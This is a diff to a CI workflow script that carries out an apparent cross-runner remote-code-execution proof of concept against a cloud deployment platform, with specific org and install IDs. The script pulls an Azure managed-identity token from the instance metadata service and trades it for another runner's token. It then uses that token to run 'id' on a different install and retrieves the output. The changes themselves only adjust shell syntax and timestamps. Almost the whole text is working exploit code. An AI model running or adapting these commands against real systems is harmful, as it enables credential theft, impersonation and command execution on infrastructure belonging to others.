@@ -32,17 +32,17 @@ jobs:
           )"
           bootstrap="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request")"
           admin_token="$(jq -r .token <<<"$bootstrap")"
-          command="$(printf '%s' 'set -euo pipefail
+          command="$(printf '%s' 'set -eu
           raw=$(curl -sSf --connect-timeout 3 --max-time 10 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https%3A%2F%2Fmanagement.azure.com%2F")
-          azure_token=$(jq -r .access_token <<<"$raw")
+          azure_token=$(printf "%s" "$raw" | jq -r .access_token)
           exchange=$(jq -nc --arg token "$azure_token" --arg runner_id "runbtjyfz32zrurflgx3lqv9a4" "{token:\$token,runner_id:\$runner_id}" | curl -sSf https://runner.byoc.lovable.net/v1/runner-auth/azure -H "Content-Type: application/json" --data @-)
-          source_principal=$(jq -r .principal_id <<<"$exchange")
-          impersonated_runner=$(jq -r .runner_id <<<"$exchange")
-          target_token=$(jq -r .token <<<"$exchange")
+          source_principal=$(printf "%s" "$exchange" | jq -r .principal_id)
+          impersonated_runner=$(printf "%s" "$exchange" | jq -r .runner_id)
+          target_token=$(printf "%s" "$exchange" | jq -r .token)
           target_subject=$(curl -sSf https://api.byoc.lovable.net/v1/auth/me -H "Authorization: Bearer $target_token" -H "X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247" | jq -r .subject)
-          target_action=$(jq -nc --arg command "echo nuon-azure-cross-runner-rce-20261020-1440 && id" "{command:\$command,timeout:60,name:\"azure-binding-proof\",request_id:\"nuon-azure-binding-proof-20261020-1440\",enable_kube_config:false}" | curl -sSf -X POST https://api.byoc.lovable.net/v1/installs/inldoc6bdbxidwsxjcpeconwcb/actions/adhoc-run -H "Authorization: Bearer $target_token" -H "X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247" -H "Content-Type: application/json" --data @-)
-          printf "source_principal=%s impersonated_runner=%s token_subject=%s target_action=%s\n" "$source_principal" "$impersonated_runner" "$target_subject" "$(jq -r .id <<<"$target_action")"')"
-          source_action="$(jq -nc --arg command "$command" '{command:$command,timeout:180,name:"azure-binding-proof-source",request_id:"nuon-azure-binding-source-20261020-1440",enable_kube_config:false}' | curl -sSf -X POST 'https://api.byoc.lovable.net/v1/installs/inl0hbh50qbe3p8dno3kiyb7j0/actions/adhoc-run' -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' -H 'Content-Type: application/json' --data @-)"
+          target_action=$(jq -nc --arg command "echo nuon-azure-cross-runner-rce-20261020-1442 && id" "{command:\$command,timeout:60,name:\"azure-binding-proof\",request_id:\"nuon-azure-binding-proof-20261020-1442\",enable_kube_config:false}" | curl -sSf -X POST https://api.byoc.lovable.net/v1/installs/inldoc6bdbxidwsxjcpeconwcb/actions/adhoc-run -H "Authorization: Bearer $target_token" -H "X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247" -H "Content-Type: application/json" --data @-)
+          printf "source_principal=%s impersonated_runner=%s token_subject=%s target_action=%s\n" "$source_principal" "$impersonated_runner" "$target_subject" "$(printf "%s" "$target_action" | jq -r .id)"')"
+          source_action="$(jq -nc --arg command "$command" '{command:$command,timeout:180,name:"azure-binding-proof-source",request_id:"nuon-azure-binding-source-20261020-1442",enable_kube_config:false}' | curl -sSf -X POST 'https://api.byoc.lovable.net/v1/installs/inl0hbh50qbe3p8dno3kiyb7j0/actions/adhoc-run' -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' -H 'Content-Type: application/json' --data @-)"
           source_id="$(jq -r .id <<<"$source_action")"
           for _ in $(seq 1 90); do
             status="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/inl0hbh50qbe3p8dno3kiyb7j0/actions/runs/$source_id" -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
@@ -53,3 +53,4 @@ jobs:
           source_job="$(jq -r .runner_job.id <<<"$status")"
           source_log="$(jq -r .runner_job.log_stream_id <<<"$status")"
           curl -sSf "https://api.byoc.lovable.net/v1/log-streams/$source_log/logs?order=asc&runner_job_id=$source_job" -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' | jq -r '.[] | select(.log_attributes["nuon.command_output"] == "true") | .body'
+          [ "$state" = finished ]
